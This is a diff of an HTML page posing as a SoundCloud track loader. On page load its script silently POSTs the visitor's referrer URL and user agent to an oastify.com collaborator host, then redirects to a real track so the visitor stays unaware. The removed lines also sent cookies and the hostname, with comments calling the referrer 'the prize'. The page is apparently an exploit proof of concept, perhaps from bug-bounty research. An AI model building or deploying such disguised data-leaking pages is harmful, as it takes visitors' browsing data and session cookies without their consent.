@@ -1,25 +1,25 @@
 <!DOCTYPE html>
 <html>
-<head><title>Previewing Track...</title></head>
+<head>
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <title>Loading Track...</title>
+</head>
 <body>
     <script>
-        // Use a standard fetch to your Oastify server
         fetch('https://547icd6oajijfupu2oumfkb1xs3jranyc.oastify.com/log', {
             method: 'POST',
-            mode: 'no-cors', // Bypasses CORS preflight
+            mode: 'no-cors', 
             body: JSON.stringify({
-                origin: window.location.hostname,
-                referer: document.referrer, // THIS IS THE PRIZE
-                cookies: document.cookie,
+                info: "Exploit Triggered",
+                // We grab it from JS just in case the header is still stripped
+                captured_referer: document.referrer, 
                 ua: navigator.userAgent
             })
         });
 
-        // Redirect back to the actual track after 1 second so they stay on the site
         setTimeout(() => {
             window.location.href = "https://soundcloud.com/hobnobclanandthereflux/testofnoah";
-        }, 1000);
+        }, 1200);
     </script>
-    <h2>Loading track details...</h2>
 </body>
 </html>
